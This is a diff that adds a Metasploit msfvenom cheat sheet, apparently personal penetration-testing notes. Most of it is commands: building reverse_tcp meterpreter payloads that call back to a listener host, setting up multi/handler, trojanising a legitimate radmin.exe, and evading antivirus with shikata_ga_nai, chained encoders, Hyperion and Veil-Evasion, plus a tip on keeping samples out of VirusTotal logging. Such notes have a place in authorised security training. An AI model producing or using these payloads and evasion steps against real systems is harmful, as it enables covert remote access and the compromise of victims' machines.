@@ -1,0 +1,170 @@
+=== msfvenom ===
+
+Payload generation tool for metasploit
+
+Example: Generate PHP venom with metasploit meterpreter payload:
+
+	msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.68.100 LPORT=2323 -f raw -o meterpreter.php
+
+Matching msf handler:
+
+	msf> use multi/handler
+	msf..> set payload php/meterpreter/reverse_tcp
+	msf..> set LHOST 192.168.68.100
+	msf..> set LPORT 2323
+	msf..> exploit
+
+
+== list pauloads ==
+
+	msfvenom -l payloads
+
+== payload options display ==
+
+	msfvenom -p windows/x64/meterpreter/reverse_tcp --list-options
+
+== list output formats ==
+
+	mfsvenom --list-formats
+	msfvenom -l formats
+
+== Generate the payload exe ==
+
+	msfvenom -p <payload> LHOST=1.2.3.4 LPORT=4444 -f exe -o exploit.exe
+
+
+	to receive the connection for the payload above:
+
+	msf> use multi/handler
+	msf..> set PAYLOAD <payload>
+	msf..> show options
+	msf..> set LHOST 1.2.3.4
+	msf..> set LPORT 4444
+	msf..> exploit
+
+
+
+== Exploit "check" functions ==
+
+Some exploits support check commands in addition to exploit.
+This command will test if the exploit would work without running the exploitation.
+Payload don't has to be specified.
+
+	msf..> check
+
+	[+] The target is vulnerable
+
+
+== MSF AUX modules ==
+
+* Example - pipe auditor
+
+	msf> use scanner/smb/pipe_auditor
+	msf> show options
+	msf> set RHOST 1.2.3.4
+	msf> exploit
+
+Examples:
+	* scanner/ftp/anonymous
+		- scans IP range for open FTP ports
+
+
+== msf console run scripts ==
+
+	meterpreter> run migrate
+		# Migrate session into sep proc
+	msf> set AutoRunScript migrate -f
+		# "Show advanced" shows those opts
+
+  Don't exit explot on session:
+
+  	msf> set ExitOnSession false
+	msf> show advaned # verify
+
+ Exploit in BG:
+
+ 	msf> exploit -j
+
+
+
+=== Trojan Generation ===
+
+ -x --template 	custom exe to be used as a template
+
+ -k --keep 		preserve themplate's original functionality
+
+Examples:
+
+	msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=2345 \
+		-x /usr/share/windows_binaries/radmin.exe -k -f exe -o radmin.exe
+
+Note: use multi/handler and don't forget to set payload on multihandler!
+
+"set ExitonSession false" to catch them all and then 'exploit -j'
+
+
+== Payload detection testing ==
+
+	www.virutstotal.com -- use to test file there.
+	But be careful, as showing file there will likely increase likelihood of in depth
+	binary analysis, resulting binary being logged into the DB
+
+
+=== msfvenom --encoders ===
+
+List available:
+
+$ msfvenom -l encoders
+
+Note: i686-w64-mingw-32-qec
+
+Ceate payload, encoded with shikata_ga_nai:
+
+$ msfvenom -p windows/meterpreter/reverse_tcp -LHOST=192.168.1.100 LPORT=2345  \
+		-e x86/shikata_ga_nai -i 10 -f exe -o meterpreter_encoded.exe
+
+	where:
+		-e - encoder to use
+		-i - number of encoding rounds
+
+== chain encoders ==
+
+(1)
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.10 LPORT=1213 \
+  		-e x86/shikata_ga_nai -i 10 -f raw -o meterpreterencoded.bin
+
+(2)
+$ msfvenom -p - -f exe -a x86 --platform windows -e x86/bloxor -i 2 \
+				-o meterpreterencoded.exe < meterpreterencoded.bin
+
+
+== Generate venom as a C buffer ==
+
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=1224 \
+		-e x86/shikata_ga_nai -i 10 -f c -o meterpreter_enc.c
+
+You get a file with unsigned char buf[], that code can be directly jumped into, e.g:
+
+	(((void*)())buf)();
+
+Thus, for embedding into the exe itself -- feel free to encode as you will.
+
+== Hyperion ==
+
+A tool for advanced payload encoding: Hyperion encodes the payload with AES using
+the key that is not stored in the binary, but rather brute-forced on the start of the app.
+E.g. payload is encoded with bruteforce-able key, and then key is thrown away.
+Any detection code that tries to analyse would need to decrypt the payload first.
+
+App is included with Kali:
+	/user/share/windows-resources/hyperion
+
+Use with wine:
+
+$ wine ./hyperion.exe in.exe out.exe
+
+
+== Veil-Evasion ==
+
+Another payload-masking tool. Interactive python script.
+
